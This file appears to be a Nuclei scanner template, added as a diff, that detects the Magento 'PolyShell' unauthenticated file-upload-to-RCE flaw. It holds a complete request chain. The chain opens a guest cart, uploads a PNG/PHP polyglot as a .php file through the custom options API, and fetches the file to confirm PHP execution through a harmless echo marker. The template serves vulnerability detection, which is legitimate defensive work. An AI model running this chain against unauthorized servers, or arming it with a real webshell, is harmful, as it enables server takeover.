@@ -1,0 +1,141 @@
+id: magento-polyshell-rce
+
+info:
+  name: Magento PolyShell – Unauthenticated File Upload to RCE
+  author: slcyber,DhiyaneshDk
+  severity: critical
+  description: |
+    Magento lacks file type validation on custom product options file upload feature accessible via unauthenticated REST/GraphQL APIs. Attackers can upload arbitrary PHP files through guest cart endpoints without authentication. Files are stored in pub/media/custom_options/quote/ directory with predictable paths. If web server allows PHP execution in media directories, this leads to remote code execution.
+  impact: |
+    Unauthenticated attackers can upload PHP webshells disguised as PNG files and achieve remote code execution on the server.
+  reference:
+    - https://github.com/markshust/magento-polyshell-patch/
+    - https://slcyber.io/research-center/magento-polyshell-unauthenticated-file-upload-to-rce-in-magento-apsb25-94/#about-assetnote
+    - https://helpx.adobe.com/security/products/magento/apsb25-94.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-434,CWE-650
+  metadata:
+    verified: true
+    max-request: 5
+    shodan-query: html:"Magento_PageCache"
+  tags: magento,file-upload,rce,intrusive
+
+flow: http(1) && http(2) && http(3) && http(4)
+
+variables:
+  php_filename: "{{rand_base(10)}}.php"
+  polyglot_b64: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAL3RFWHRDb21tZW50ACc8P3BocCBlY2hvICJSRVNVTFQ6IiAuICgyICogMTMzNyk7ID8+J0bMDMoAAAAPSURBVHgBAQQA+/8Ad/rpBEYCW5i/poUAAAAASUVORK5CYII="
+
+http:
+  - raw:
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"query": "{ products(search: \"\", pageSize: 1) { items { sku } } }"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "products","data")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: json
+        name: product_sku
+        internal: true
+        json:
+          - '.data.products.items[0].sku'
+
+  - raw:
+      - |
+        POST /rest/default/V1/guest-carts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+        internal: true
+
+    extractors:
+      - type: regex
+        name: cart_id
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - '"([a-zA-Z0-9]+)"'
+
+  - raw:
+      - |
+        POST /rest/default/V1/guest-carts/{{cart_id}}/items HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"cart_item":{"product_option":{"extension_attributes":{"custom_options":[{"extension_attributes":{"file_info":{"base64_encoded_data":"{{polyglot_b64}}","name":"{{php_filename}}","type":"image/png"}},"option_id":"12345","option_value":"file"}]}},"qty":1,"sku":"{{product_sku}}"}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "option_value","option_id")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: upload_subdir1
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - 'custom_options[\\/\\\\]+quote[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]'
+
+      - type: regex
+        name: upload_subdir2
+        internal: true
+        part: body
+        group: 2
+        regex:
+          - 'custom_options[\\/\\\\]+quote[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]'
+
+      - type: regex
+        name: upload_filename
+        internal: true
+        part: body
+        group: 3
+        regex:
+          - 'custom_options[\\/\\\\]+quote[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]+([a-zA-Z0-9]+\.php)'
+
+  - raw:
+      - |
+        GET /pub/media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "RESULT:2674")'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'RESULT:([0-9]+)'
+# digest: 490a0046304402203b712fd0c6164edcfa108634243144bccf28d9c2b25dd77d37480930eae8ad7d022029ecf4f28fe6514a904358d86f0670fb62e3db8836480d899bc30ebee6e42b6f:922c64590222798bb761d5b6d8e72950
